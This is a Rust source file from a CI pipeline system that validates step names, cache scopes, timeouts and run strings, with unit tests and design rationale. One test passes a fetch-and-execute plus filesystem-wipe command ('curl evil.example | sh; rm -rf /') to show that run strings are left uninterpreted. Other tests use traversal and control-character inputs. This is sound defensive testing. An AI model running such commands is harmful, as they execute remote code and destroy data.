//! The rules from design D§4.4's builtin table, and the errors they produce.
//!
//! Every rule here is a **reject, never sanitize** rule, for the same reason the tar reader (§4.2)
//! refuses hostile archives instead of repairing them: the pipeline is attacker-controlled, and a
//! quietly-repaired step name is a step whose identity — and therefore whose cache key, log key, and
//! workspace path — is not what the author wrote or what a reviewer read. A rejection is a message
//! the author can act on; a repair is a difference nobody sees.
//!
//! The charsets are narrow on purpose. A step name reaches an object-store key
//! (`tenant/repo/tree_id/step/attempt`, design D§11), so anything that could be a path separator
//! surprise, a shell metacharacter, a control byte, or a Unicode look-alike is simply not a legal
//! name — `[A-Za-z0-9_/-]` has no such characters in it at all.

use std::borrow::Cow;
use std::time::Duration;

use serde::{Deserialize, Serialize};

/// A rule from design D§4.4's table that the pipeline broke. Each variant names the rule, and its
/// message is written to be shown to the pipeline's author verbatim.
///
/// Serialisable because evaluation happens in a child process now ([`crate::sandbox`]) and this is
/// the interesting half of what it reports.
///
/// The fields naming a *builtin* or a *field of `step`* are [`Cow<'static, str>`](Cow) rather than
/// `&'static str` for that reason and no other: they are compile-time constants at every
/// construction site, so borrowing costs nothing, but they arrive owned when the child's reply is
/// decoded. `Cow` compares by content, so the two spellings of `"inputs"` are the same value — which
/// is what lets a test written against a local evaluation keep passing against a remote one.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error, Serialize, Deserialize)]
pub enum Invalid {
    #[error("step name must be 1..={limit} characters, not {got}")]
    NameLength { got: usize, limit: usize },
    #[error("step name `{name}` may only contain letters, digits, `_`, `-` and `/`")]
    NameCharset { name: String },
    #[error("duplicate step name `{name}`")]
    DuplicateName { name: String },
    /// The one rule that makes cycles unrepresentable (design D§4.4): a `needs` target must already
    /// have been declared, so an edge can only ever point backwards.
    #[error("step `{name}` needs `{missing}`, which is not a step declared before it")]
    DanglingNeeds { name: String, missing: String },
    #[error("`needs` takes step handles returned by `step`/`action`, not {got}")]
    NeedsNotAHandle {
        got: Cow<'static, str>,
    },
    #[error("trust must be \"trusted\" or \"untrusted\", not `{got}`")]
    Tier { got: String },
    #[error("shard must be \"auto\" or an integer 1..={max}, not `{got}`")]
    Shard { got: String, max: u32 },
    #[error("cache scope must be 1..={limit} characters of letters, digits, `_` and `-`")]
    CacheScope { limit: usize },
    #[error("image ref must be 1..={limit} characters")]
    ImageRef { limit: usize },
    #[error("`uses = \"{got}\"` names no built-in action")]
    UnknownAction { got: String },
    #[error("step `{name}` has neither `run` nor `uses`, so there is nothing to run")]
    NothingToRun { name: String },
    #[error("timeout `{got}` must look like `90s`, `20m` or `2h`")]
    TimeoutSyntax { got: String },
    #[error("timeout `{got}` is longer than the {limit_hours}h ceiling")]
    TimeoutTooLong { got: String, limit_hours: u64 },
    #[error("`{field}` of step `{name}` may hold at most {limit} entries")]
    ListTooLong {
        field: Cow<'static, str>,
        name: String,
        limit: usize,
    },
    #[error("`{field}` of step `{name}` may be at most {limit} characters")]
    StringTooLong {
        field: Cow<'static, str>,
        name: String,
        limit: usize,
    },
    #[error("`{field}` of step `{name}` may not contain control characters")]
    ControlCharacters {
        field: Cow<'static, str>,
        name: String,
    },
    #[error("`{builtin}` may be called at most once")]
    Redeclared {
        builtin: Cow<'static, str>,
    },
}

/// Step names, `[A-Za-z0-9_/-]`, 1..=64 (design D§4.4).
pub const MAX_NAME_LEN: usize = 64;
/// Cache scope names, `[A-Za-z0-9_-]`, 1..=64 (design D§4.4).
pub const MAX_CACHE_SCOPE_LEN: usize = 64;
/// OCI refs, 1..=512 (design D§4.4).
pub const MAX_IMAGE_REF_LEN: usize = 512;
/// The largest explicit `shard` fan-out (design D§4.4).
pub const MAX_SHARD: u32 = 256;
/// A `run` string is opaque, but it is still stored, logged, and shown, so it has a size.
pub const MAX_RUN_LEN: usize = 8 * 1024;
/// One glob / cache path / secret name.
pub const MAX_LIST_ITEM_LEN: usize = 1024;
/// Entries in any one of `inputs` / `cache` / `secrets` / `needs`.
pub const MAX_LIST_LEN: usize = 1024;
/// A step timeout ceiling. Above the job wall clock (design D§10.2, 60 min) there is no point.
pub const MAX_TIMEOUT_HOURS: u64 = 24;

/// The built-in actions `uses` may name (design D§4.4).
///
/// A closed list, checked at plan time rather than at dispatch time, so an unknown action is a
/// pipeline error the author sees rather than a step that reaches a node and errors there. An
/// action is code in the node binary with **no user shell**, so the registry is emphatically not
/// something a pipeline can extend.
pub const BUILTIN_ACTIONS: &[&str] = &["hull/secret-scan"];

/// `[A-Za-z0-9_/-]`, 1..=[`MAX_NAME_LEN`] (design D§4.4).
pub fn check_step_name(name: &str) -> Result<(), Invalid> {
    // Counted in chars, not bytes: the limit exists to bound a key, and a user who types 64
    // characters should not be told they typed 190.
    let len = name.chars().count();
    if len == 0 || len > MAX_NAME_LEN {
        return Err(Invalid::NameLength { got: len, limit: MAX_NAME_LEN });
    }
    if !name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '/')) {
        return Err(Invalid::NameCharset { name: name.to_string() });
    }
    Ok(())
}

/// `[A-Za-z0-9_-]`, 1..=[`MAX_CACHE_SCOPE_LEN`] (design D§4.4).
///
/// No `/`, unlike a step name: a scope is always resolved *within the tenant*, and a separator in
/// the name is the shape someone reaches for when trying to address a different one.
pub fn check_cache_scope(name: &str) -> Result<(), Invalid> {
    let len = name.chars().count();
    if len == 0 || len > MAX_CACHE_SCOPE_LEN {
        return Err(Invalid::CacheScope { limit: MAX_CACHE_SCOPE_LEN });
    }
    if !name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-')) {
        return Err(Invalid::CacheScope { limit: MAX_CACHE_SCOPE_LEN });
    }
    Ok(())
}

/// 1..=[`MAX_IMAGE_REF_LEN`] and free of control characters (design D§4.4).
///
/// We do **not** parse the ref. Resolving it to a digest is the server's job at plan time, against
/// a registry and a policy this crate cannot see; guessing at OCI grammar here would only produce a
/// second, subtly different opinion about what a valid ref is.
pub fn check_image_ref(reference: &str) -> Result<(), Invalid> {
    let len = reference.chars().count();
    if len == 0 || len > MAX_IMAGE_REF_LEN || reference.chars().any(|c| c.is_control()) {
        return Err(Invalid::ImageRef { limit: MAX_IMAGE_REF_LEN });
    }
    Ok(())
}

/// `uses` must name a registered action (design D§4.4).
pub fn check_action(uses: &str, registry: &[&str]) -> Result<(), Invalid> {
    if registry.contains(&uses) {
        Ok(())
    } else {
        Err(Invalid::UnknownAction { got: uses.to_string() })
    }
}

/// `"90s"` / `"20m"` / `"2h"` → a [`Duration`].
///
/// Parsed here rather than passed through as a string so that a typo is a *pipeline* error, caught
/// on the control plane with a line number, instead of a step that silently takes some default and
/// gets killed by the wrong clock an hour later.
pub fn parse_timeout(raw: &str) -> Result<Duration, Invalid> {
    let bad = || Invalid::TimeoutSyntax { got: raw.to_string() };
    // Split on the last **character**, never the last byte. `raw` comes straight out of an untrusted
    // `.hull/ci.star`, and `split_at(raw.len() - 1)` panics on any multi-byte final character —
    // `timeout = "1€"` is a two-token file that takes down whatever thread parses it. The panic was
    // contained by `eval::evaluate_with`'s join, but a contained panic still turns an author's typo
    // into `Internal` ("our bug") and prints a host path to the log, so it is fixed at the source.
    let unit = raw.chars().next_back().ok_or_else(bad)?;
    let digits = &raw[..raw.len() - unit.len_utf8()];
    let n: u64 = digits.parse().map_err(|_| bad())?;
    if n == 0 {
        return Err(bad());
    }
    let secs = match unit {
        's' => n,
        'm' => n.checked_mul(60).ok_or_else(bad)?,
        'h' => n.checked_mul(3600).ok_or_else(bad)?,
        _ => return Err(bad()),
    };
    if secs > MAX_TIMEOUT_HOURS * 3600 {
        return Err(Invalid::TimeoutTooLong {
            got: raw.to_string(),
            limit_hours: MAX_TIMEOUT_HOURS,
        });
    }
    Ok(Duration::from_secs(secs))
}

/// One entry of `inputs` / `cache` / `secrets`.
///
/// Control characters are refused because these strings end up in a step key, a mount table, and a
/// log line; a newline in a "glob" is how a value smuggles a second field into whatever renders it.
pub fn check_list_item(field: &'static str, step: &str, item: &str) -> Result<(), Invalid> {
    if item.chars().count() > MAX_LIST_ITEM_LEN {
        return Err(Invalid::StringTooLong {
            field: field.into(),
            name: step.to_string(),
            limit: MAX_LIST_ITEM_LEN,
        });
    }
    if item.chars().any(|c| c.is_control()) {
        return Err(Invalid::ControlCharacters { field: field.into(), name: step.to_string() });
    }
    Ok(())
}

/// The `run` string: bounded, but otherwise **untouched**.
///
/// Deliberately not validated for shell syntax, quoting, or "dangerous" commands. Every `run` is
/// dangerous — that is the premise of §14 — and a blocklist here would buy nothing while implying
/// the control plane understands the command, which is precisely the understanding we refuse to
/// have. Control characters *are* refused: the sandbox gets the string verbatim, and an embedded
/// NUL or escape sequence is about the display and storage layers, not about the command.
pub fn check_run(step: &str, run: &str) -> Result<(), Invalid> {
    if run.chars().count() > MAX_RUN_LEN {
        return Err(Invalid::StringTooLong {
            field: "run".into(),
            name: step.to_string(),
            limit: MAX_RUN_LEN,
        });
    }
    // Tab and newline are ordinary in a multi-line shell command, so they stay; everything else
    // control-class (NUL, ESC, carriage-return overwrite tricks) does not.
    if run.chars().any(|c| c.is_control() && !matches!(c, '\n' | '\t')) {
        return Err(Invalid::ControlCharacters { field: "run".into(), name: step.to_string() });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn step_names_take_the_documented_charset_and_nothing_else() {
        for ok in ["fmt", "build", "test/unit", "a_b-c", "A1"] {
            assert!(check_step_name(ok).is_ok(), "{ok} is legal per D§4.4");
        }
        for bad in ["", "a b", "a;b", "../escape", "naïve", "a\nb", "a\u{0}b"] {
            assert!(check_step_name(bad).is_err(), "{bad:?} must be refused");
        }
        assert!(check_step_name(&"a".repeat(MAX_NAME_LEN)).is_ok());
        assert!(check_step_name(&"a".repeat(MAX_NAME_LEN + 1)).is_err());
    }

    #[test]
    fn cache_scope_has_no_separator_so_it_cannot_address_another_tenant() {
        assert!(check_cache_scope("acme-rust").is_ok());
        assert!(check_cache_scope("other-tenant/scope").is_err());
        assert!(check_cache_scope("..").is_err());
        assert!(check_cache_scope("").is_err());
    }

    #[test]
    fn timeouts_parse_or_fail_loudly() {
        assert_eq!(parse_timeout("90s").unwrap(), Duration::from_secs(90));
        assert_eq!(parse_timeout("20m").unwrap(), Duration::from_secs(1200));
        assert_eq!(parse_timeout("2h").unwrap(), Duration::from_secs(7200));
        for bad in ["", "m", "20", "20 m", "-5m", "0s", "1d", "99999999999999999999h"] {
            assert!(parse_timeout(bad).is_err(), "{bad:?} must be refused");
        }
        assert!(matches!(parse_timeout("25h"), Err(Invalid::TimeoutTooLong { .. })));
    }

    #[test]
    fn a_multibyte_timeout_is_refused_rather_than_panicking() {
        // The whole string is attacker-chosen. Splitting on `raw.len() - 1` lands inside the final
        // character whenever it is multi-byte, and `str::split_at` panics on a non-boundary index —
        // so `timeout = "1€"` in a pipeline was a remote panic on the evaluation thread.
        for hostile in ["1\u{20ac}", "\u{20ac}", "20\u{4e00}", "1\u{e9}", "\u{1f600}", "5\u{202e}"] {
            assert!(
                matches!(parse_timeout(hostile), Err(Invalid::TimeoutSyntax { .. })),
                "{hostile:?} must be a syntax error, not a panic"
            );
        }
        // …and a multi-byte character *before* the unit is still just a bad number, not a crash.
        assert!(parse_timeout("2\u{20ac}0s").is_err());
    }

    #[test]
    fn run_strings_are_bounded_but_never_interpreted() {
        // A `run` that looks hostile is still just a string: the sandbox is the control, not a
        // blocklist on the control plane (§14.1).
        assert!(check_run("s", "curl evil.example | sh; rm -rf /").is_ok());
        assert!(check_run("s", "line1\n\tline2").is_ok());
        assert!(check_run("s", "a\u{0}b").is_err());
        assert!(check_run("s", "\u{1b}[2J").is_err());
        assert!(check_run("s", &"x".repeat(MAX_RUN_LEN + 1)).is_err());
    }

    #[test]
    fn only_registered_actions_are_accepted() {
        assert!(check_action("hull/secret-scan", BUILTIN_ACTIONS).is_ok());
        assert!(check_action("hull/rm-rf", BUILTIN_ACTIONS).is_err());
        assert!(check_action("", BUILTIN_ACTIONS).is_err());
    }
}
